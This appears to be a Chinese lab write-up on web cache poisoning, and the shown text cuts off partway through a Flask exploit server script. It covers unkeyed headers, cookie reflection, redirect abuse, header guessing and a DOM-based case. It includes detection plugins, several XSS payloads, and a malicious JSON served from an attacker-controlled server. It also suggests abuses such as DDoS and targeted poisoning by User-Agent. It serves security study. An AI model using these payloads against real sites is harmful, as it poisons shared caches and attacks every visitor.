+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># X-Forwarded-Host in Response</span></span><br><span class="line"><span class="attr">id:</span> <span class="string">x-forwarded-host</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">Reflect</span> <span class="string">for</span> <span class="string">X-Forwarded-Host</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Low</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ran:</span> <span class="string">&#x27;RandomString(4)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;X-Forwarded-Host&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        StatusCode() == 200 &amp;&amp; StringSearch(&quot;Response&quot;,&quot;xforhosttest&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>插件说明：</p>
+<blockquote>
+<ol>
+<li><p>生成一个4位的随机数(可要可不要)</p>
+</li>
+<li><p>添加一个标识: “cookiereflect”。组合成payload: 随机数+标识</p>
+</li>
+<li><p>5个一样的payload表示重复5次发包</p>
+</li>
+<li><p>加入到请求头”Header: payload”也就是 “X-Forwarded-Host:xforhosttestxxxx “</p>
+</li>
+<li><p>如果状态码是200并且响应包找到”xforhosttest”，表示存在该问题</p>
+</li>
+</ol>
+</blockquote>
+<p>如果在响应中检测到X-Forwarded-Host的值，说明该值可控。（注意，有时侯需要反复检查，因为不一定会命中缓存）</p>
+<p>开启监听后，将主页请求代理到扫描器成功检测出了一个X-Forwarded-Host的回显。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126150819389.png" alt="image-20210126150819389"></p>
+<p>扫描器帮我们发现可疑点后就需要进行手动测试了，将请求放到BurpSuite的Repeater，添加X-Forwarded-Host请求，为了避免影响到其他用户，我们选择别人不会访问的资源，所有构造了一个url: ?test=1 插入X-Forwarded-Host后并没有找到回显。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126154246309.png" alt="image-20210126154246309"></p>
+<p>通过分析，发现是<code>X-Cache: hit</code>的原因，hit表示命中缓存，所有X-Forwarded-Host还是之前缓存的内容。不断重放请求知道test回显出来，回显之后继续重放，直到再次出现<code>X-Cache: hit</code>。表示现在已经命中了新的缓存。<a target="_blank" rel="noopener" href="https://blog.csdn.net/jeffasd/article/details/60140438">不同厂商的CDN</a> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126154627672.png" alt="image-20210126154627672"></p>
+<h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p>确认缓存后，接下来就是确认危害性，由于我们是对一个没有人访问的资源进行投毒，所以不会影响到其他用户，可以构造任意的payload。最常见的当然是XSS。</p>
+<p>此处我们构造出XSS Payload <code>&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126155448168.png" alt="image-20210126155448168"></p>
+<p>重放请求直到<code>X-Cache: hit</code>命中新的缓存。</p>
+<p>用浏览器请求这个资源发现如图，无法弹出cookie。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126160158690.png" alt="image-20210126160158690"></p>
+<p>对cookie进行分析，发现使用了HttpOnly，无法通过js加载Cookie。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126160316805.png" alt="image-20210126160316805"></p>
+<p>通过对X-Forwarded-Host的投毒，成功将self xss转变成了对任意用户的xss攻击。</p>
+<h3 id="3-4-Cookie投毒"><a href="#3-4-Cookie投毒" class="headerlink" title="3.4 Cookie投毒"></a>3.4 Cookie投毒</h3><p>要对cookie进行测试首先得确定是否回显，同样编写了一个针对cook回显的jaeles插件</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">cookie-reflect-body</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">Cookie</span> <span class="string">reflect</span> <span class="string">in</span> <span class="string">body</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Low</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ran:</span> <span class="string">RandomString(4)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;cookiereflect<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Cookie(&quot;[[.original]]&#123;&#123;.payload&#125;&#125;&quot;)</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;Cookie&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StatusCode()</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">StringSearch(&quot;Response&quot;,&quot;cookiereflect&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<p>插件说明：</p>
+<blockquote>
+<ol>
+<li><p>生成四位随机数</p>
+</li>
+<li><p>添加cookiereflect标识</p>
+</li>
+<li><p>组成payload: 标识+随机字符</p>
+</li>
+<li><p>请求头添加cookie,这里有两种，”Cookie: payload” ; “Cookie:param=payload”</p>
+</li>
+<li><p>在响应中搜索标识</p>
+</li>
+</ol>
+</blockquote>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210128152651406.png" alt="image-20210128152651406"></p>
+<p>检测到回显（在测试可能需要多次测试以命中缓存）后，接下来就是该参数是否是unkeyed。</p>
+<p>注入payload:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>重放包，直到<code>X-Cache: hit</code></p>
+<p>命中缓存。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210128154155722.png" alt="image-20210128154155722"></p>
+<p>任何用户访问主站就会遭受到xss攻击</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210128154012345.png" alt="image-20210128154012345"></p>
+<h3 id="3-5-多个请求头的投毒"><a href="#3-5-多个请求头的投毒" class="headerlink" title="3.5 多个请求头的投毒"></a>3.5 多个请求头的投毒</h3><p>后台支持 <code>X-Forwarded-Host</code> and <code>X-Forwarded-Scheme</code> 两个请求头，当 <code>X-Forwarded-Scheme</code> 的值是非https时，服务器会重定向到 https协议的指定URL，该URL的值取决于请求头 <code>X-Forwarded-Host</code> </p>
+<p>编写一个插件用来检测此逻辑的插件</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">x-forwarded-scheme-http-host-redirect.yaml</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">x-forwarded-scheme</span> <span class="string">https</span> <span class="string">host</span> <span class="string">redirect</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Medium</span></span><br><span class="line"></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">    http</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;X-Forwarded-Scheme&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        StatusCode() == 302</span></span><br><span class="line"><span class="string"></span>  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;X-Forwarded-Scheme&quot;</span><span class="string">)</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;shadowtest&quot;,</span> <span class="string">&quot;X-Forwarded-Host&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StringSearch(&quot;resHeaders&quot;,</span> <span class="string">&quot;shadowtest&quot;</span><span class="string">)</span></span><br></pre></td></tr></table></figure>
+
+<p>插件说明：</p>
+<blockquote>
+<ol>
+<li><p>给http请求头添加一个字段”X-Forwarded-Scheme: http”</p>
+</li>
+<li><p>如果状态码是302就继续发一个包，添加如下两个请求字段。</p>
+<ul>
+<li>“X-Forwarded-Scheme: http”；</li>
+<li>X-Forwarded-Host: shadowtest”</li>
+</ul>
+</li>
+<li><p>在这个响应头中搜索”shadowtest”, 如果找到表面存在漏洞</p>
+</li>
+</ol>
+</blockquote>
+<p>除此之外，我另外再写了一个X-Forwarde-Scheme跳转的检测插件，用来做一个粗略的检查</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">x-forwarded-scheme-302.yaml</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">X-Forwarded-Scheme</span> <span class="number">302</span> <span class="string">redirect</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Low</span></span><br><span class="line"></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">    http</span></span><br><span class="line"><span class="string"></span>  <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">    https</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;X-Forwarded-Scheme&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StatusCode()</span> <span class="string">==</span> <span class="number">302</span></span><br></pre></td></tr></table></figure>
+
+<p>插件说明</p>
+<blockquote>
+<p>给请求头分别添加”X-Forwarded-Scheme: http” 和”X-Forwarded-Scheme: https” 。查看是否有302跳转。</p>
+</blockquote>
+<p>对靶场地址测试后，插件成功检测到了相关安全问题(同样如果是缓存导致的跳转，要多次测试才能命中缓存)。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210130110131055.png" alt="image-20210130110131055"></p>
+<p>接下来就是手工验证了。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210130110228316.png" alt="image-20210130110228316"></p>
+<p>如上图，我们设置了一个example.com。重定向了example.com。由于命中缓存后，后续用户都会被重定向到example.com。像这种我们可以怎么样来利用呢？</p>
+<blockquote>
+<ol>
+<li>如果是一个访问量极大的站，我们可以用来进行ddos攻击</li>
+<li>我们可以把地址设置成恶意服务器来引入恶意脚本</li>
+<li>用来做seo优化 </li>
+</ol>
+</blockquote>
+<h3 id="3-6-猜测请求头投毒"><a href="#3-6-猜测请求头投毒" class="headerlink" title="3.6 猜测请求头投毒"></a>3.6 猜测请求头投毒</h3><p>本实验unkey存在于请求头的X-Host参数，而这这个参数并不存在于HTTP协议，所以我们需要猜测。根据<a target="_blank" rel="noopener" href="https://github.com/PortSwigger/param-miner">param Miner</a>的字典进行简化，编写了如下的测试脚步来进行Header的枚举，进行粗略检测。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">simple-guess-headers</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">level:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">simple</span> <span class="string">Guess</span> <span class="string">headers</span> </span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Low</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ran:</span> <span class="string">RandomString(4)</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">head:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      accept</span></span><br><span class="line"><span class="string">      accept-charset</span></span><br><span class="line"><span class="string">      accept-encoding</span></span><br><span class="line"><span class="string">      accept-language</span></span><br><span class="line"><span class="string">      x-host</span></span><br><span class="line"><span class="string">      x-forward-for</span></span><br><span class="line"><span class="string">      x-forwarded-host</span></span><br><span class="line"><span class="string">      x-forwarded-scheme</span></span><br><span class="line"><span class="string">      authorization</span></span><br><span class="line"><span class="string">      cache-control</span></span><br><span class="line"><span class="string">      connection</span></span><br><span class="line"><span class="string">      content-location</span></span><br><span class="line"><span class="string">      content-type</span></span><br><span class="line"><span class="string">      cookie</span></span><br><span class="line"><span class="string">      expires</span></span><br><span class="line"><span class="string">      forwarded</span></span><br><span class="line"><span class="string">      from</span></span><br><span class="line"><span class="string">      proxy-authenticate</span></span><br><span class="line"><span class="string">      proxy-authorization</span></span><br><span class="line"><span class="string">      server</span></span><br><span class="line"><span class="string">      set-cookie</span></span><br><span class="line"><span class="string">      user-agent</span></span><br><span class="line"><span class="string">      x-forwarded-protocol</span></span><br><span class="line"><span class="string">      x-original-url</span></span><br><span class="line"><span class="string">      x-rewrite-url</span></span><br><span class="line"><span class="string">      client-ip</span></span><br><span class="line"><span class="string">      x-real-ip</span></span><br><span class="line"><span class="string">      x-originating-ip</span></span><br><span class="line"><span class="string">      uri</span></span><br><span class="line"><span class="string">      x-authentication</span></span><br><span class="line"><span class="string">      x-authentication-key</span></span><br><span class="line"><span class="string">      x-authorization</span></span><br><span class="line"><span class="string">      x-auth-token</span></span><br><span class="line"><span class="string">      proxy-http</span></span><br><span class="line"><span class="string">      proxy-socks4</span></span><br><span class="line"><span class="string">      proxy-socks5</span></span><br><span class="line"><span class="string">      redirect</span></span><br><span class="line"><span class="string">      method</span></span><br><span class="line"><span class="string">      x-forwarded-server</span></span><br><span class="line"><span class="string">      Origin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;.head&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;headereflect&#123;&#123;.ran&#125;&#125;&quot;,</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;.payload&#125;&#125;</span>&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StringSearch(&quot;response&quot;,</span> <span class="string">&quot;headereflect&quot;</span><span class="string">)</span></span><br></pre></td></tr></table></figure>
+
+<p>检测到x-host参数后当然可以直接投毒，但是这里这个案例可以通过User-Agent实现定向投毒的，在返回包</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210130170904429.png" alt="image-20210130170904429"></p>
+<p>我们可以看到一个字段 “Vary: User-Agent”。Vary就是用来表明额外将谁加入cache key的。这里的意思是User-Agent也会加入到cache key 中，如果我们指定一个比较通用的User-Agent就会给很多用户投毒，如果指定某个特定用户的User-Agent我们就可以针对性的投毒。</p>
+<p>本题中，我们可以在留言处插入一段如下脚步，让别人访问自己的网站，从而拿到他人的User-Agent，从而实现定向攻击。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210201090054053.png" alt="image-20210201090054053"></p>
+<h3 id="3-7-DOM投毒"><a href="#3-7-DOM投毒" class="headerlink" title="3.7 DOM投毒"></a>3.7 DOM投毒</h3><p>用前面编写的插件直接对靶机发起漏洞探测。很块就发现了一个X-Forwarded-Host回显的问题。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202151540464.png" alt="image-20210202151540464"></p>
+<p>之前写的两个插件都检测到了，guess-headers是爆破header字段的，里面也有X-Forwarded-Host，当然也能检测到。我们看一下数据包，明显有X-Forwarded-Host回显问题。但这只是个潜在问题，并不能说明有安全问题。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202151922285.png" alt="image-20210202151922285"></p>
+<p>放入BurpSuite 进行手工测试。为了不影响其他用户，设置一个不存在的资源(<code>/?test=1</code>)进行投毒。重复发包，直到<code>X-Cache: hit</code>命中缓存。（如果响应包有Set-Cookie不能真的存入缓存中，找一个有cookie的请求来测试）</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202153512601.png" alt="image-20210202153512601"></p>
+<p>复制url地址，在浏览器中访问，投毒成功。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202163616096.png" alt="image-20210202163616096"></p>
+<p>这次靶场与前面不同的是可控值存入到了json中。没办法直接插入xss paylod。我们需要找到其他利用点。</p>
+<p>目前我们已知一个可控点，下一步，我们看一下此可控点是否被引用。</p>
+<p>在返回包里搜索data，可以发现<code>initGeoLocate()</code>是有引用的，这也许就是突破点。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210201141404173.png" alt="image-20210201141404173"></p>
+<p>我们不妨把完整的url给它拼接出来<a target="_blank" rel="noopener" href="https://ac711f051e66707780530770007a000c.web-security-academy.net/resources/json/geolocate.json%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%90%8E%E5%8F%91%E7%8E%B0%E5%A6%82%E4%B8%8Bjson%E6%95%B0%E6%8D%AE%E3%80%82">https://ac711f051e66707780530770007a000c.web-security-academy.net/resources/json/geolocate.json，访问后发现如下json数据。</a></p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210201141629661.png" alt="image-20210201141629661"></p>
+<p>我们回到浏览器研究一下这个函数<code>initGeoLocate()</code>函数。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initGeoLocate</span>(<span class="params">jsonUrl</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fetch(jsonUrl)</span><br><span class="line">        .then(<span class="function"><span class="params">r</span> =&gt;</span> r.json())</span><br><span class="line">        .then(<span class="function"><span class="params">j</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> geoLocateContent = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;shipping-info&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">            img.setAttribute(<span class="string">&quot;src&quot;</span>, <span class="string">&quot;/resources/images/localShipping.svg&quot;</span>);</span><br><span class="line">            geoLocateContent.appendChild(img)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">            div.innerHTML = <span class="string">&#x27;Free shipping to &#x27;</span> + j.country;</span><br><span class="line">            geoLocateContent.appendChild(div)</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该函数拿到上图所示json数据。然后<code>div.innerHTML = &#39;Free shipping to &#39; + j.country;</code>中将country的值输出到DOM节点<code>shipping-info</code>中。</p>
+<p>从如上分析，我们可控的<code>X-Forwarded-Host</code>的值被传递到data中，然后又被作为参数传递到<code>initGeoLocate()</code>中。并且<code>initGeoLocate()</code>从我们可控的url中取出参数输出到DOM节点中。</p>
+<p>由此，我们可以构造恶意的json数据，并且将恶意数据的url存到缓存中，这样，只有有人访问该页面，就会加载恶意的json数据并且执行</p>
+<p><strong>攻击步骤：</strong></p>
+<ol>
+<li><p>在可控的服务器上构造一个xss payload。下图是靶场提供的利用服务器。注意使用<code>Access-Control-Allow-Origin: *</code>来避免跨域问题。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/resources/<span class="type">json</span>/geolocate.json</span><br><span class="line"><span class="keyword">Access</span>-Control-Allow-Origin: *</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;country&quot;: &quot;&lt;img src=1 onerror=alert(document.cookie) /&gt;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202164838827.png" alt="image-20210202164838827"></p>
+<p>只要访问该资源就被攻击。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202165248679.png" alt="image-20210202165248679"></p>
+<p>在自己的vps上也写了一个exp。但是可能是实验环境的限制，没有加载成功。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/resources/json/geolocate.json&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">root</span>():</span></span><br><span class="line">    t = &#123;</span><br><span class="line">        <span class="string">&#x27;country&#x27;</span>: <span class="string">&#x27;&lt;img src=a onerror=alert(document.domain)&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(t), <span class="number">200</span>, [(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="string">&quot;*&quot;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run(host=<span 